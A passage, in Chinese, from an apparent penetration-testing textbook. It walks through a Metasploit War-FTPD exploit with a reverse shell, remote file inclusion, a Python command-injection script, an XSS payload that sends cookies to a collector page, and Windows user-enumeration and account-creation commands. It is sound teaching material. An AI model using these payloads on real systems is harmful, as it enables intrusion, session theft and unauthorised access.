  \ Metasploit 时使用。我们将文件保存为 `~/.msf3/modules/exploits/windows/ftp/warftpd.rb`，这样它的位置将镜像\
  \ Metasploit 树中的位置。当我们加载 Metasploit 时，它会检查 `~/.msf3` 目录中的模块，并像加载 Metasploit 树中的模块一样加载它们。\n\
  \n### 执行漏洞利用\n\n让我们试试看。我们在命令提示符下输入 `msfconsole` 加载 Metasploit 控制台。一旦看到 `msf >` 提示符，我们就可以开始了。图\
  \ 9.10 显示了配置 War-FTPD 漏洞利用选项所需的命令序列。我们输入 `use exploit/windows/ftp/warftpd` 来使用我们创建的模块。这是我们保存模块到主目录的路径。接下来，我们配置\
  \ `RHOST` 变量，设置要攻击的 FTP 服务器，本例中为 `192.168.1.7`。\n\n![image](img/F000096f09-10-9781597497299.jpg)\n\
  \n图 9.10 配置 War-FTPD 漏洞利用的执行\n\n现在，我们设置要用于此漏洞利用的有效载荷，本例中为 `Meterpreter reverse_tcp`\
  \ 有效载荷。该有效载荷会回连到我们，因此我们需要使用 `LHOST` 变量设置本地主机 IP 地址。我们经常选择这个有效载荷，因为让主机回连到我们通常可以绕过防火墙和其他网络防御措施。我们有很多有效载荷可供选择。要列出所有可用的有效载荷，可以输入\
  \ `show payloads`，然后选择任何适用于我们攻击平台的有效载荷。\n\n我们设置的所有关键方面现已完成。但如果想确保所有部分都已就位，可以发出命令\
  \ `show options`。图 9.11 显示了新模块中配置的选项。\n\n![image](img/F000096f09-11-9781597497299.jpg)\n\
  \n图 9.11 为 War-FTPD 漏洞利用配置的选项\n\n所有选项验证完毕后，我们就可以攻击目标了。`exploit` 命令将针对远程目标执行我们的代码。如果我们所做的一切都正确，应该会收到类似\
  \ 图 9.12 的响应。该过程包括启动一个监听器供漏洞利用回连，连接到目标操作系统，发送漏洞利用，并获取 shell。对于像 `Meterpreter` 这样的多部分有效载荷，漏洞利用中包含一个阶段器，用于从我们的服务器拉取第二阶段。在这些情况下，我们会看到发送阶段的消息。一旦\
  \ shell 返回，我们会看到 shell 已打开。当我们使用 `Meterpreter` 时，会看到 `Meterpreter` 提示符，表示我们现在处于\
  \ `Meterpreter` shell 中。\n\n![image](img/F000096f09-12-9781597497299.jpg)\n\n图 9.12\
  \ 使用 Metasploit 成功利用 War-FTPD\n\n\n\n\n\n现在我们的主机已被成功利用，我们可以继续执行后渗透任务。第 10 章将展示如何使用\
  \ Meterpreter 脚本辅助后渗透任务。Metasploit 既是一个开源框架，也是一款商业产品。当我们编写可能对他人有用的代码时，可以将这些代码回馈给社区，并使其被纳入项目。要了解更多关于为\
  \ Metasploit 框架开发的信息，请访问[`dev.metasploit.com`](http://dev.metasploit.com)。\n\n##\
  \ 利用 PHP 脚本\n\nPHP 脚本是互联网上被利用最多的脚本之一。在[`exploit-db.com`](http://exploit-db.com)上搜索\
  \ PHP 会得到大量结果。编写安全的 PHP 并不难，但大多数学习 PHP 的资源并不专注于编写安全的 PHP。因此，当人们提出出色的新应用创意时，安全性往往被事后考虑。这一点——再加上一些相当常见且易于修复的\
  \ Web 配置错误——导致网站每天都被黑客攻击。在本节中，我们将重点讨论远程文件包含（RFI）和跨站脚本（XSS）漏洞。我们将看到这些编码疏忽和配置问题如何导致严重的入侵。\n\
  \n### 远程文件包含\n\n在渗透测试中，我们能发现的最危险的漏洞类型之一是远程文件包含（RFI）。RFI 使我们能够在 Web 服务器上以运行 Web 服务器的用户身份执行代码。借助这一点，我们可以生成\
  \ shell、包含其他代码，并通过后渗透操作可能提升权限。这种类型的漏洞经常导致其他资源被入侵，因为 Web 服务器随后被用来攻击其他主机。让我们更仔细地了解\
  \ RFI 是什么、它是如何发生的，以及我们如何让一个存在漏洞的应用屈服于我们的意志。\n\n#### 什么是远程文件包含？\n\n当应用的用户获得对某个变量的控制权，使得用户指定的代码能够被执行，而不是应用开发者预期的代码时，就会发生\
  \ RFI。RFI 与本地文件包含（LFI）的区别在于，代码可以位于另一台服务器上。\n\n在 PHP 应用中，通常有两个问题会导致 RFI 漏洞。第一个是应用中的逻辑错误。通常，这些漏洞是由于某些文件被期望作为包含其他文件的页面的一部分而被包含。当这些文件被独立执行时，没有配置文件来指定这些变量的默认值，并且如果\
  \ Web 服务器配置不当，用户可能能够在请求中指定它们。\n\n当逻辑错误与不安全的 PHP 设置（如`register_globals`和`allow_url_include`）结合时，逻辑问题就突然变成了\
  \ RFI 漏洞。`Register_globals`告诉 Web 服务器获取 GET 和 POST 变量并将其定义为变量。这意味着，如果一个文件期望`$config_dir`在另一个文件中被定义，而那个文件没有被包含，那么在\
  \ GET 或 POST 请求中指定`config_dir`将允许应用用户指定它。仅此一点只是 LFI，但当同时设置了`allow_url_include`时，我们现在可以使用\
  \ URL 文件位置。\n\n一旦我们能够包含自己的文件，这个应用就不再是开发者的应用，而是我们的了。通过使用 PHP shell、自定义代码，甚至 Metasploit，我们可以将自己的逻辑包含到应用中，以获得对主机或网络的额外访问权限，并且我们可以利用这两者来获得对企业网络的进一步访问。\n\
  \n#### 利用 Autonomous LAN Party\n\nAutonomous LAN Party 是一个帮助管理局域网派对的应用程序。由于一个 RFI\
  \ 漏洞，它也是一个允许访问 Web 服务器的应用程序。你可以在[exploit-db.com](http://exploit-db.com)上找到关于该漏洞的更多信息，具体地址为[www.exploit-db.com/exploits/9460/](http://www.exploit-db.com/exploits/9460/)。一旦我们从漏洞参考中指示的位置下载了源代码，就可以解压并将其复制到我们的\
  \ Web 根目录`/var/www/alp`。\n\n现在我们已经有了代码，可以安装它。但为了演示这个漏洞，我们不需要这样做。让我们看看存在漏洞的页面`/var/www/alp/include/_bot.php`的代码：\n\
  \n```\n<?php require_once $master[’currentskin’].’_bot.php’; ?>\n\n<body>\n\n</html>\n\
  ```\n\n这是一个旨在被包含在另一个脚本中的文件示例。但在这里，它可以被独立调用。该文件使用`require_once`来包含当前皮肤对应的`_bot.php`副本。问题在于，没有配置信息，脚本不知道`$master[’currentskin’]`是什么。也许我们可以帮上忙。不过，默认情况下，我们的\
  \ Web 服务器配置得相当安全。让我们修改一下，以便模拟一个我们在实际环境中可能遇到的服务器。\n\n我们需要修改`/etc/php5/apache2/php.ini`文件中的两个变量。在我们喜欢的编辑器中，打开文件并搜索`register_globals`，将其从\
  \ Off 改为 On。接下来，搜索`allow_url_include`，将其从 Off 改为 On。现在保存文件并执行命令`service apache2\
  \ restart`。我们现在有了一个存在漏洞的 Web 服务。\n\n我们在第 5 章中创建了一个名为`shell.php`的文件。如果我们将该文件复制为`shell.txt`，就可以开始利用我们的漏洞了。我们需要控制`$master[’currentskin’]`变量。为了控制这个变量，我们需要构造一个\
  \ GET 请求，使得该变量被`register_globals`设置。当我们访问 URL [http://localhost/alp/include/_bot.php?master[currentskin]=http://localhost/shell.txt?](http://localhost/alp/include/_bot.php%3Fmaster%5Bcurrentskin)时，应该会看到我们的\
  \ shell，如图 9.13 所示。我们的 shell 被包含在存在漏洞的应用中，因为我们提供了文件的 URL，并在其后加了一个问号。如果没有问号，这将不起作用：require\
  \ 行正在追加`_bot.php`指令。通过使用问号，我们将`_bot.php`视为传递给脚本的一个选项。现在我们应该在机器上拥有一个可用的 shell。\n\n\
  ![image](img/F000096f09-13-9781597497299.jpg)\n\n图 9.13 利用 Autonomous LAN Party\
  \ 运行我们的自定义 shell\n\n#### 使用 Metasploit 利用 RFI\n\nMetasploit 也能够利用 RFI 漏洞，并且借助 Metasploit，我们获得了\
  \ Metasploit 有效载荷的强大功能。我们将利用 Autonomous LAN Party 漏洞，并借助`php_include` Metasploit\
  \ 模块的强大功能，以获得更高级的 PHP Meterpreter shell。PHP Meterpreter shell 将允许我们在 Web 服务器的上下文中路由流量、执行\
  \ shell 命令以及执行 Meterpreter 脚本。\n\n要使用`php_include`漏洞模块，我们启动`msfconsole`并输入`use exploit/unix/webapp/php_include`。一旦进入`php_include`模块的上下文，我们会看到一些之前没有使用过的额外选项。`PHPRFIDB`是\
  \ PHP 远程文件包含数据库，其中包含关于克服 RFI 常见问题的不同方法的猜测。`PHPURI`选项保存了我们的远程文件包含所在的 URI。`PHPURI`选项有一个特殊功能，它与`PHPRFIDB`配合使用，我们在希望发生\
  \ RFI 的位置插入`XXpathXX`，Metasploit 将尝试多种不同的方式使其有效工作。这有助于我们处理棘手的 RFI 漏洞，并减轻确保漏洞利用细节得到处理的负担。\n\
  \n我们提供变量。在这个例子中，`RHOST`将是`127.0.0.1`，`PHPURI`将是`/alp/include/_bot.php?master[currentskin]=XXpathXX?`，我们的有效载荷将是`php/meterpreter/reverse_tcp`。剩下的唯一事情是设置`LHOST`（本例中为`192.168.192.132`）。现在，我们通过输入`exploit`来运行它。\n\
  \n\n\n\n\n图 9.14 展示了使用 PHP Meterpreter 载荷成功攻击 Autonomous LAN Party 的过程。从这里开始，我们能够执行许多与常规\
  \ Meterpreter 相同的后期利用操作。\n\n注意\n\n虽然 PHP Meterpreter 具备标准 Windows Meterpreter 的大部分功能，但某些功能依赖于平台。部分特性可能不可用，或者工作方式不同。通过反复试验是确定差异的最佳方法。由于\
  \ Metasploit 不断演进，请务必使用最新的 SVN 版本以获得最完整的功能。\n\n![图片](img/F000096f09-14-9781597497299.jpg)\n\
  \n图 9.14 使用 PHP Meterpreter 载荷成功攻击 Autonomous LAN Party\n\n### 命令执行漏洞\n\n命令执行漏洞允许通过脚本执行任意命令，原因是输入验证检查不足。在本节中，我们将探讨一个命令执行漏洞，并了解如何构建一个快速脚本来执行任意代码。并非所有漏洞都如此直接，但了解这些漏洞的工作原理将有助于我们在实际中遇到更复杂的例子时知道如何利用它们。\n\
  \n#### 查找命令执行漏洞\n\n命令执行漏洞是由于将未充分净化的信息传递给诸如 `passthru` 或 `system` 之类的 shell 函数而导致的。通过注入额外代码，我们可以使这些函数执行我们想要的命令，除了（或替代）它们原本要运行的命令。让我们看一个例子。\n\
  \n```php\n<?php\n\n   if($_GET[’ip’])\n   {\n     print \"<PRE>\\n\";\n     passthru(\"\
  /usr/local/bin/traceroute {$_GET[’ip’]}\");\n     print \"</PRE>\\n\";\n   }\n\n\
  ?>\n<BR>\n   <FORM METHOD=GET>\n   IP: <INPUT TYPE=TEXT NAME=ip>\n   <INPUT TYPE=SUBMIT>\n\
  \   </FORM>\n```\n\n在这个代码示例中，脚本的意图是允许用户输入一个 IP 地址，然后脚本打印出 traceroute 的结果。有人可能会设置这样一个脚本来调试网络问题。问题在于，如果没有对\
  \ IP 地址进行净化，用户可以在 `traceroute` 后面串联其他命令。让我们将代码保存为 `traceroute.php` 并利用它。\n\n通过访问\
  \ URL [`http://localhost/traceroute.php?ip=127.0.0.1;ls`](http://localhost/traceroute.php%3Fip%3D127.0.0.1%3Bls)，我们可以看到除了打印\
  \ traceroute 结果外，还显示了一个目录列表。如果我们对 `$_GET[’ip’]` 变量进行了净化，使其对 shell 安全，就不会出现这个问题。不过，有时我们确实希望能够以网页之外的其他方式处理信息。让我们构建一个脚本来帮助解析数据。\n\
  \n```python\n#!/usr/bin/python\n\nimport httplib, urllib, sys\n\ndata = \" \".join(sys.argv[1:])\n\
  \nc = httplib.HTTPConnection(\"localhost:80\")\n\nopts = urllib.urlencode({’ip’\
  \ : \"127.0.0.1; \" + data })\n\nreq = \"/traceroute.php?\" + opts\n\nc.request(\"\
  GET\",req)\n\nresp = c.getresponse()\n\ndata = resp.read()\n\nc.close()\n\nlines\
  \ = data.split(\"n\")\n\nprint \"\\n\".join(lines[3:-7])\n```\n\n我们需要三个库来构建 shell\
  \ 版本的利用脚本。我们需要 `httplib` 来处理 HTTP 连接，`urllib` 来帮助我们进行 URL 编码命令，以及 `sys` 模块来处理命令行参数。为了构建我们想要执行的命令，我们需要从命令行获取除\
  \ `argv[0]`（程序名称）之外的所有参数。为此，我们取 `argv[1]` 到 `argv` 数组的最后一个参数，并用空格连接这些命令。\n\n接下来，我们建立到\
  \ localhost 端口 80 的连接，并将该连接赋值给变量 `c`。现在，我们需要构建查询字符串。我们使用 `urllib.urlencode` 来编码数据。我们希望\
  \ `traceroute` 的输出保持一致，因此我们让 `traceroute` 命令指向 127.0.0.1，添加一个分号，然后附加我们的命令。分号是命令分隔符，表示\
  \ `traceroute` 命令结束并开始一个新命令。通过对数据进行 URL 编码，我们确保 Web 服务器会按照我们的意图进行解释。\n\n接下来，我们构建请求\
  \ URL。我们将 `traceroute.php` URL 和我们编码的选项赋值给 `request` 变量，然后通过之前生成的连接向该 URL 发出 GET\
  \ 请求。我们将响应赋值给 `resp` 对象，然后将响应读取到 `data` 对象中。读取响应会将内容从对象中取出，以便后续访问。我们完成了连接，因此关闭与服务器的连接，获取\
  \ `data` 并将其按行分割。由于我们在 localhost 上使用了 `traceroute`，我们知道其输出始终相同。这样做的目的是只解析会变化的部分，并在后续执行时将其打印到屏幕上。输出的前三行是\
  \ traceroute 数据，最后七行是 HTTP 数据。我们只想打印命令的输出，因此我们从第四行（数组元素 3）开始，到倒数第七行结束，用换行符将这些行连接起来。\n\
  \n当我们保存 Python 文件并使其可执行后，我们应该能够运行该脚本，向其传递我们想在服务器上执行的命令，并且只显示该命令的输出。图 9.15 展示了执行\
  \ `id` 命令的脚本输出。我们可以看到，我们能够以 Web 用户的身份执行代码，并且现在有了一种简单的方法来在服务器上执行任何我们想要的命令。\n\n![图片](img/F000096f09-15-9781597497299.jpg)\n\
  \n图 9.15 使用 Python 利用命令执行漏洞运行 `id` 命令\n\n## 跨站脚本\n\n跨站脚本（XSS）是一种存在了二十多年的漏洞。尽管历史悠久，但它仍然是向管理层解释起来最困难的漏洞之一。大多数\
  \ XSS 示例都很糟糕，它们只是向屏幕写入信息或创建一个显示“XSS”的 JavaScript 警告框。这看起来相当无害，根本没有触及 XSS 能做什么。\n\
  \n诸如浏览器利用框架（BeEF）之类的流行框架使我们能够演示如何将 XSS 缺陷转化为扫描器，用于分析用户、窃取浏览器 cookie，甚至让浏览器自我利用。这使得\
  \ XSS 的强大功能更加明显。对 XSS 缺陷进行基本利用并不需要框架，但像 BeEF（[`http://beef.googlecode.com`](http://beef.googlecode.com)）这样的产品有助于我们利用运行\
  \ JavaScript 的浏览器来执行更复杂的任务。在本节中，我们将了解如何验证 XSS 缺陷，以及如何利用此类缺陷进行基本的 cookie 窃取。\n\n\
  ### 什么是 XSS？\n\n与大多数 Web 应用程序漏洞一样，XSS 的存在是由于输入净化不足。XSS 有两种类型：存储型和反射型。存储型 XSS 存在于博客或论坛等场景中，用户可以在其中发表评论或提交信息，这些信息会在浏览器中呈现。当信息显示给查看者时，由于应用程序没有过滤掉\
  \ HTML 字符，这些信息最终会被渲染而不是仅作为输出。这些值存储在后台，每个查看者查看页面时都会受到 XSS 代码的影响。\n\n反射型 XSS 通常发生在网络钓鱼攻击中，攻击者发送一个包含输入的链接，当用户点击该链接时，输入会被回显给用户。这在搜索引擎和其他类型的表单中很常见，这些表单会在我们输入数据时回显结果。数据不是持久性的，因此除非管理员查看日志，否则很难发现。这类攻击通常更具针对性，因为它们需要用户主动获取内容，而不是在浏览器正常操作时呈现内容。\n\
  \n### 利用 XSS\n\n\n\n\n我们将研究一个搜索引擎应用的框架，作者试图防止 XSS，但遗漏了一个字段。通过利用这个反射型 XSS 漏洞，我们将针对一个已知拥有站点管理员权限的用户，并窃取该用户的\
  \ Cookie。对于这个应用框架来说，这不会提供任何特殊权限，但在现实世界中，攻击者会利用这种攻击手段从受害者那里窃取会话或其他重要信息。由于这是一种现实世界的攻击，因此在渗透测试的范围内能够检测、理解并解释这种攻击类型非常重要。\n\
  \n```\n<div align=center>\n\n<FORM METHOD=GET>\n\nWelcome to the easy search engine,\
  \ input your query below:<BR>\n\n<INPUT TYPE=TEXT NAME=query VALUE=\"<?php echo\
  \ $_GET[’query’]?>\">\n\n<INPUT TYPE=SUBMIT VALUE=\"Search!\"></BR>\n\n</FORM>\n\
  \n<?php\n\nif($_GET[’query’])\n\n{\n\n   print \"<BR>You searched for \" . htmlspecialchars($_GET[’query’])\
  \ . \"<BR>\\n\";\n\n}\n\n?>\n\n</div>\n```\n\n首先，让我们看看这个存在漏洞的应用。该应用接受一个搜索选项，并显示我们搜索的内容，同时用上一次的查询预填充搜索框。当我们打印搜索到的信息时，使用了`htmlspecialchars`函数来生成安全的\
  \ HTML。然而，在填充搜索框字段时，没有使用任何转义函数。只要输入中不包含`\"`符号，这本来是可以的。但是，一旦我们在搜索框中放入引号，HTML 输出中的标签值就会被破坏。\n\
  \n图 9.16 显示了当提交查询`test\">xss`时`search.php`的输出。\n\n![image](img/F000096f09-16-9781597497299.jpg)\n\
  \n图 9.16 包含引号字符串的 Search.php 输出\n\n从图 9.16 中我们可以看到，引号和大于号在源代码中闭合了`INPUT`标签，并且`xss`短语显示在屏幕上。我们可以利用这个漏洞来执行我们的脚本。当我们将输入转换为有效的\
  \ HTML 脚本时，就可以在网页中引入我们自己的功能。在图 9.17 中，我们发送了查询`\"><script>alert('xss')</script>`，并得到了一个弹出框，验证了我们能够成功运行脚本。\n\
  \n![image](img/F000096f09-17-9781597497299.jpg)\n\n图 9.17 在存在漏洞的 search.php 上首次执行脚本\n\
  \n我们的目标是能够从目标那里窃取 Cookie。如果没有一种自动接收数据的方法，仅仅构建一个脚本并没有多大用处。为此，我们需要在某处放置一个基本的日志记录脚本。这个脚本需要能够通过\
  \ GET 请求接收数据，然后将数据保存下来供后续处理。为此，我们可以创建另一个基本的 PHP 脚本。\n\n```\n<?php\n\n$f = fopen(\"\
  /var/www/outfile\",\"a+\");\n\nfwrite($f,$_GET[’cookie’] . \"\\n\");\n\nfclose($f);\n\
  \n?>\n```\n\n我们的脚本将以追加模式打开一个输出文件，并写入通过 GET 请求提交的 cookie 变量。文件关闭后，我们就可以获取数据，并使用诸如\
  \ Web Developer Toolbar 之类的工具将这些 Cookie 添加到我们的浏览器中。不过，目前我们还没有任何 Cookie，所以下一步是创建一个为我们设置\
  \ Cookie 的网页。我们想要生成两个 Cookie：一个用于管理员标志（因为获得管理员标志总是很有趣），另一个用于会话 Cookie（因为它们更贴近现实世界）。\n\
  \n注意\n\nWeb Developer Toolbar 可以在[`chrispederick.com/work/web-developer/`](http://chrispederick.com/work/web-developer/)找到，并且支持\
  \ Firefox 和 Chrome。这个工具栏允许我们打开或关闭表单元素，查看网页的扩展信息，移除字段的长度限制等。这个工具栏和 Firebug 是渗透测试中非常有用的两个扩展。Firebug\
  \ 可以帮助我们调试页面上的脚本，查看正在加载的内容，并探索 HTML 页面的文档对象模型（DOM）。Firebug 可以在[`getfirebug.com`](http://getfirebug.com)找到。\n\
  \n```\n<?php\n\nsetcookie(’admin’,1,0,’/’,’localhost’);\n\nsetcookie(’session’,md5(time()),0,’/’,’localhost’);\n\
  \n?>\n```\n\n我们的 PHP 代码非常简单。我们使用`setcookie`函数来设置两个 Cookie：`admin`和`session`。`setcookie`的第二个参数是值。对于`admin`，我们的值是`1`；对于`session`，我们的会话值是当前时间的\
  \ MD5 哈希值。第三个参数是 Cookie 的有效时间（以秒为单位）。有效时间为`0`会创建一个会话 Cookie，当浏览器关闭时就会消失。任何其他值都表示\
  \ Cookie 的持续时间（秒）。接下来的两个变量是有效路径和 Cookie 应有效的域。这些值决定了浏览器何时将 Cookie 发送到服务器。通过限制 Cookie\
  \ 的路径和域，我们可以确保在共享托管环境中，我们的 Cookie 不会传输到除我们自己页面以外的任何页面。Cookie 必须在向浏览器发送输出之前设置。Cookie\
  \ 是在 HTTP 响应的头部设置的，一旦数据开始发送到浏览器，头部就无法修改。\n\n警告\n\n仅凭时间作为会话值的种子是不够的。PHP 有内置的会话处理功能；不要试图重新发明轮子。在大多数情况下，当一种语言提供了伪随机数或会话生成的功能时，请使用它。当我们尝试创建新东西时，更有可能产生有漏洞的代码，而且它可能不如专家编写的代码安全——除非你是该领域的专家，在这种情况下，当你创造出新的、很棒的东西时，记得回馈社区。\n\
  \n现在所有部分都已创建，是时候整合我们的漏洞利用代码了。首先，我们需要确保输出文件已创建并由 Web 服务器拥有。为此，我们在`/var/www`目录下执行命令`touch\
  \ outfile`，然后执行`chown www-data outfile`。现在，我们的输出文件由 Web 服务器拥有。因此，我们的嗅探脚本`sniffer.php`应该能够写入输出文件。我们的\
  \ Cookie 文件`setcookie.php`是我们需要访问的第一个页面。访问[`localhost/setcookie.php`](http://localhost/setcookie.php)应该会设置我们需要的\
  \ Cookie。为了验证 Cookie 是否已设置，我们可以在浏览器中访问`javascript:alert(document.cookie)`。运行这段代码应该会弹出一个包含我们设置的\
  \ Cookie 的对话框。接下来，我们进入搜索页面。我们需要构造一个 URL，可以发送给目标，使其 Cookie 被转发到我们的嗅探页面。为此，我们需要创建一个\
  \ URL，该 URL 将为我们提交 GET 请求，并包含我们注入的 XSS 代码。\n\n我们的 XSS URL 应该如下所示：\n\n```\n\"><script>document.write('<IMG\
  \ SRC=\"http://localhost/sniffer.php?cookie='+document.cookie + '\">');</script\
  \ \"\n```\n\n我们可能会在 Firefox 中看到一个弹出窗口，因为 NoScript 插件试图保护我们。继续操作是没问题的；除非我们继续，否则示例不会生效。我们应该会看到搜索框中有一个小的损坏图像图标，并且搜索内容打印在下方。图\
  \ 9.18 显示了输出文件以及最终的网页。我们的 XSS 使用 JavaScript 的`document.write`方法打印出一个`IMG`标签，其源指向我们的`sniffer.php`页面。我们向该页面传递一个参数：cookie\
  \ 键，其值附加到我们的`document.cookie`值字符串中。\n\n![image](img/F000096f09-18-9781597497299.jpg)\n\
  \n图 9.18 成功利用 search.php 脚本\n\n我们追加了闭合标签和方法括号的闭合。最后，我们闭合了脚本标签。通过在字符串末尾打开另一个引号，我们确保注入代码的标签会提供闭合引号和大于号来闭合标签。这可以防止脚本将\
  \ HTML 代码片段显示在屏幕上，从而避免有人察觉我们的行为。\n\n\n\n我们在图 9.18 中看到两个变量保存在输出文件中。每个值以分号分隔，可以插入到浏览器中模拟目标用户。我们成功创建了一个可在实战中使用的\
  \ XSS Cookie 窃取漏洞。通常我们可能还需要其他信息，例如客户端的引用来源和 IP 地址。这些内容在专业使用前可能会添加，但我们已经在第 7 章中探讨过这些概念。\n\
  \n## 总结\n\n在本章中，我们探讨了使用脚本语言进行漏洞利用的不同策略和方法。使用 Python，我们创建了一个利用缓冲区溢出漏洞获取远程 Shell 的\
  \ War-FTPD 漏洞利用程序。在编写出概念验证代码后，我们研究了如何将漏洞利用程序转化为更通用的 Metasploit 漏洞利用模块（使用 Ruby）。\n\
  \n如今许多漏洞出现在 Web 应用程序中，因此我们研究了三种不同类型的 Web 漏洞：远程文件包含（RFI）、命令执行和跨站脚本（XSS）。我们利用远程文件包含漏洞将自定义\
  \ Shell 注入到易受攻击的应用程序中，然后研究了如何将 PHP Meterpreter Shell 注入到同一应用程序中。我们检查了命令执行漏洞，并演示了如何通过易受攻击的\
  \ Web 应用程序执行命令。最后，我们在搜索页面中研究了跨站脚本漏洞，并将多个代码片段组合在一起，创建了一个可用的 XSS 漏洞利用程序。\n\n我们探索了多种利用脚本技术来提升对目标网络访问权限的方法。我们可以构建和移植网络漏洞利用程序、利用\
  \ Web 漏洞、窃取会话以获取 Web 页面上的额外访问权限。我们使用了 Ruby、PHP、Python 和 JavaScript。每个示例都展示了脚本在渗透测试的漏洞利用阶段中的关键作用，现在我们对如何在渗透测试过程中使用脚本以获取网络和\
  \ Web 资源的额外访问权限有了更深入的理解。\n\n# 第 10 章\n\n# 后渗透脚本\n\n## 本章内容：\n\n• 为什么后渗透很重要\n• Windows\
  \ Shell 命令\n• 收集网络信息\n• 编写 Metasploit Meterpreter 脚本\n• 数据库后渗透\n\n进入一台机器只是成功的一半。能够利用一个资产、收集信息，并利用这些信息进一步获取网络或其他资源的访问权限，是区分普通渗透测试人员与优秀渗透测试人员的技能。在本章中，我们将学习一些基本的\
  \ Shell 脚本，用于在漏洞利用成功后收集信息。我们还将研究如何通过 Meterpreter 脚本进一步获取访问权限。完成网络后渗透后，我们将利用数据库漏洞挖掘数据并获取\
  \ Shell 访问权限。\n\n## 为什么后渗透很重要\n\n后渗透利用我们已有的访问权限，尝试扩展和提升这些权限。理解网络资源如何交互，以及如何从一个被攻陷的机器跳转到下一个，为我们的客户带来了真正的价值。正确识别环境中的易受攻击机器，并证明这些漏洞是可利用的，这很好。但能够收集信息以证明重大业务影响则更好。无论是确保客户数据得到保护、关键\
  \ Web 基础设施不受影响，还是流水线流程持续运行，目标导向的渗透测试有助于满足业务需求：确保业务能够持续运作。如果没有数据以及将发现的漏洞与严重业务问题联系起来的能力，我们无法在渗透测试范围内证明这一点。\n\
  \n## Windows Shell 命令\n\nWindows 仍然是企业环境中部署最广泛的操作系统平台。能够从命令行操作 Windows 操作系统是企业渗透测试的基本要求。我们需要能够调查正在运行的服务、确定网络信息以及操作用户。\n\
  \n### 用户管理\n\n能够枚举本地和域用户及组，以及向本地机器和域中添加用户，使我们能够为进一步攻击环境建立桥头堡。在渗透测试过程中，我们需要准备一些易于使用的\
  \ Shell 脚本，以便在无法使用支持本地脚本包含（如 Meterpreter）的 Shell 时，能够将这些命令复制粘贴到 Shell 会话中。\n\n####\
  \ 列出用户和组\n\n在 Windows 中有多种获取用户列表的方法。我们将重点介绍`net`和`wmic`命令。在本章中，我们将使用这些命令来操作用户。但在本节中，我们将使用它们查询本地机器和域中的用户信息。\n\
  \n使用`net`命令，我们可以操作用户和组、查看网络共享，甚至操作服务。在本章中，我们将重点介绍如何使用此工具进行用户和组操作。如果我们拥有域权限，甚至可以使用此命令管理域用户和组。让我们先获取简单的用户列表。要列出系统上的用户，我们将使用`net\
  \ user`命令。与大多数 Windows 命令一样，在命令末尾添加`/?`标志将显示帮助信息。单独输入`net user`会返回类似于图 10.1 的信息，显示本地系统上的用户列表。如果我们想查看域用户，可以添加`/domain`标志，它将列出域中的所有用户。\n\
  \n![image](img/F000102f10-01-9781597497299.jpg)\n\n图 10.1 net user 命令的输出\n\n获取用户列表通常是后渗透的重要任务。我们可以了解哪些用户位于哪些系统上。如果我们在多个系统上看到同一个用户，那么该用户就是密码攻击的主要目标，这样我们就可以访问更多工作站。\n\
  \n`net user`命令还可以用于获取特定用户的信息。通过执行`net user <用户 ID>`命令，我们可以从命令行获取用户的所有信息，包括组成员身份。\n\
  \n我们也可以从`wmic`命令获取类似信息。`WMIC`是 Windows Management Instrumentation Command-Line（Windows\
  \ 管理规范命令行）的缩写。`wmic`命令允许我们获取比许多其他命令更具体的系统信息。例如，如果我们想知道用户的 SID（内部标识符），`net user`命令无法提供，但图\
  \ 10.2 展示了如何使用 WMIC 提供该信息。\n\n![image](img/F000102f10-02-9781597497299.jpg)\n\n\
  图 10.2 WMIC 中的用户账户信息\n\n在此输出中，我们要求 Windows 管理规范（WMI）接口列出系统上的用户账户。我们指定了完整指令以获取尽可能多的账户信息；否则，我们将获得摘要形式的信息。\n\
  \n提示\n\n`WMIC`非常强大。它可以用于查询、创建和操作进程、用户、系统信息、打印作业等。值得花一点时间熟悉`wmic`命令，因为它将在渗透测试中帮助我们。在恶意软件分析或其他可能处理木马化二进制文件的任务中，它也很有帮助。\n\
  \n我们已经了解了如何获取一个用户的信息，但如果想获取每个用户的全部`net user`信息呢？通过 Windows 命令 Shell 中的 for 循环，我们可以结合`wmic`和`net\
  \ user`来获取系统上所有用户的扩展信息。\n\n```\nfor /F \"skip=1\" %i in (’wmic useraccount get name’)\
  \ do net user %i >> c:\\users.txt\n```\n\n\n\n\n该过程遍历从 `wmic useraccount get name`\
  \ 获取的系统上的每个用户，并对该用户执行 `net user` 命令。`wmic useraccount get name` 的输出被赋值给 `%i` 变量。`skip=1`\
  \ 指令告诉 for 循环跳过第一行。对于列出的每个账户名称，`net user` 命令获取该账户的信息，而 `>>` 运算符则指示将输出追加到 `users.txt`\
  \ 文件中。\n\n通过追加到文件，我们实现了两个目标：第一，我们拥有一个可以从系统下载的单一文件，其中包含我们需要的所有信息；第二，只有成功的查询才会被记录到文件中。任何错误消息或状态信息都将打印到屏幕上。这为我们提供了一种干净的方式来获取系统中的所有用户，以便我们下载信息并稍后查看。\n\
  \n现在我们已经掌握了一些列出用户的方法，接下来看看组。组比用户更重要，因为它们让我们知道哪些用户比其他用户更重要。虽然这不是对相关人员价值的评判，但从安全角度来看，有些账户确实比其他账户更值得我们关注。`net\
  \ localgroup` 和 `net group` 命令将帮助我们找到这些用户。\n\n`net localgroup` 命令允许我们列出并获取关于当前所在机器本地组的信息，而\
  \ `net group` 命令用于获取域中组的信息。`net localgroup` 命令的工作方式与 `net user` 命令非常相似；如果不指定参数，它会列出系统上的组，但如果指定了组名，则会获取关于该指定组的信息。\n\
  \n与 `net user` 命令一样，当我们想要提取所有组及其成员信息并将其记录到文件时，一些脚本编写会有所帮助。\n\n```\nfor /F \"delims=^∗\
  \ tokens=1 skip=4\" %i in (’net localgroup’) do net localgroup %i >> c:\\groups.txt\n\
  ```\n\n我们可以提取系统上的所有组，获取它们的成员列表，并将其全部记录到文件中。`net localgroup` 命令在每个组名的开头放置一个星号。但当我们查询组名时，需要去掉\
  \ `^∗` 字符。为此，我们在 for 循环中添加了一些额外的选项。`delims` 关键字让 for 循环知道如何拆分 `net localgroup` 的输出。我们使用\
  \ `tokens` 关键字获取元素 1，而 `skip` 让我们跳过前四行标题。我们遍历 `net localgroup` 命令的每个元素，然后执行 `net\
  \ localgroup <groupname>` 命令。图 10.3 显示了命令的输出。\n\n![image](img/F000102f10-03-9781597497299.jpg)\n\
  \n图 10.3 `c:\\groups.txt` 的内容\n\n#### 添加用户和组\n\n现在我们知道如何列出用户了，接下来创建新用户。创建账户表明我们已获得对机器的管理访问权限，但如果我们选择弱密码，也可能为他人入侵机器打开大门。我们将使用\
  \ `net user` 和 `net localgroup` 命令来创建用户和组。\n\n```\nnet user admin SecUr3P4Ssw0Rd!\
